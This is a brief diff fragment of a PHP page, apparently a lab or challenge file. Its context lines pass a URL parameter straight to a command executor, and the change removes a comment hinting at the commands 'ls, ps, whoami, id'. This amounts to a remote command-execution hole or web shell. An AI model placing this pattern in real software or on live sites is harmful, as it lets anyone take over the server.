@@ -12,6 +12,5 @@ $command = $_GET['command'];
 $executor->execute($command);
 
 ?>
-<!--ls, ps, whoami, id-->
 </body>
 </html>
